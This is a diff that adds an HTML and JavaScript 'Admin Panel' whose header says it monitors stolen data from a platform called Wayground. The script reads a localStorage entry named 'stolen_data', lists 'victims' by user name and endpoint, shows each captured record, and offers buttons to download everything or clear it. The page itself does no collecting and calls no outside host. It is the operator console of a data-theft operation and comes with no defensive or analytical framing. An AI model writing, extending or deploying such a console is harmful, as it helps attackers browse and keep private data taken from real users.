@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Panel</title>
+    <style>
+        body { font-family: Arial; margin: 20px; background: #1a1a1a; color: #00ff00; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { background: #2d3748; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .stats { display: flex; gap: 15px; margin: 20px 0; flex-wrap: wrap; }
+        .stat { background: #4a5568; padding: 15px; border-radius: 8px; min-width: 150px; text-align: center; }
+        .victim-list { background: #2d3748; padding: 20px; border-radius: 10px; margin: 20px 0; }
+        .victim { background: #4a5568; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; }
+        .victim:hover { background: #5a6578; }
+        .data-view { background: #2d3748; padding: 20px; border-radius: 10px; margin: 20px 0; }
+        pre { background: #000; color: #0f0; padding: 15px; border-radius: 5px; overflow-x: auto; font-size: 12px; max-height: 500px; overflow-y: auto; }
+        button { background: #48bb78; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
+        button:hover { background: #38a169; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🕵️ Admin Panel - Collected Data</h1>
+            <p>Monitoring stolen data from Wayground</p>
+            <button onclick="refreshData()">🔄 Refresh</button>
+            <button onclick="downloadAllData()">💾 Download All</button>
+            <button onclick="clearData()">🗑️ Clear All</button>
+        </div>
+
+        <div class="stats">
+            <div class="stat">
+                <div id="totalEntries">0</div>
+                <div>Data Entries</div>
+            </div>
+            <div class="stat">
+                <div id="uniqueUsers">0</div>
+                <div>Unique Users</div>
+            </div>
+            <div class="stat">
+                <div id="lastCollection">Never</div>
+                <div>Last Collection</div>
+            </div>
+        </div>
+
+        <div class="victim-list">
+            <h3>🎯 Collected Data</h3>
+            <div id="dataContainer">Loading...</div>
+        </div>
+
+        <div class="data-view">
+            <h3>📊 Data Preview</h3>
+            <div id="preview">
+                <p>Select an entry to view details</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function loadData() {
+            const data = localStorage.getItem('stolen_data');
+            const allData = data ? JSON.parse(data) : {};
+            
+            updateStats(allData);
+            displayData(allData);
+        }
+        
+        function updateStats(data) {
+            const entries = Object.keys(data).length;
+            const users = new Set();
+            
+            Object.values(data).forEach(entry => {
+                if (entry.user) users.add(entry.user);
+            });
+            
+            document.getElementById('totalEntries').textContent = entries;
+            document.getElementById('uniqueUsers').textContent = users.size;
+            
+            const lastTime = Object.keys(data).sort().pop();
+            document.getElementById('lastCollection').textContent = 
+                lastTime ? new Date(lastTime).toLocaleTimeString() : 'Never';
+        }
+        
+        function displayData(data) {
+            const container = document.getElementById('dataContainer');
+            
+            if (Object.keys(data).length === 0) {
+                container.innerHTML = '<p>No data collected yet. Wait for victims to visit.</p>';
+                return;
+            }
+            
+            let html = '';
+            Object.entries(data).forEach(([timestamp, entry]) => {
+                html += `
+                    <div class="victim" onclick="showDetails('${timestamp}')">
+                        <strong>👤 ${entry.user}</strong>
+                        <span style="float: right; color: #aaa;">
+                            ${entry.endpoint} • ${new Date(timestamp).toLocaleString()}
+                        </span>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+        
+        function showDetails(timestamp) {
+            const data = JSON.parse(localStorage.getItem('stolen_data'));
+            const entry = data[timestamp];
+            
+            document.getElementById('preview').innerHTML = `
+                <h4>User: ${entry.user}</h4>
+                <p><strong>Endpoint:</strong> ${entry.endpoint}</p>
+                <p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
+                <pre>${JSON.stringify(entry.data, null, 2)}</pre>
+                <button onclick="downloadEntry('${timestamp}')">📥 Download This Entry</button>
+            `;
+        }
+        
+        function downloadEntry(timestamp) {
+            const data = JSON.parse(localStorage.getItem('stolen_data'));
+            const entry = data[timestamp];
+            
+            const blob = new Blob([JSON.stringify(entry, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `data-${entry.user}-${timestamp}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        function downloadAllData() {
+            const data = localStorage.getItem('stolen_data');
+            const blob = new Blob([data], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `all-collected-data-${Date.now()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        function clearData() {
+            if (confirm('Delete ALL collected data?')) {
+                localStorage.removeItem('stolen_data');
+                loadData();
+            }
+        }
+        
+        function refreshData() {
+            loadData();
+        }
+        
+        // Авто-обновление
+        window.onload = function() {
+            loadData();
+            setInterval(loadData, 3000);
+        };
+    </script>
+</body>
+</html>
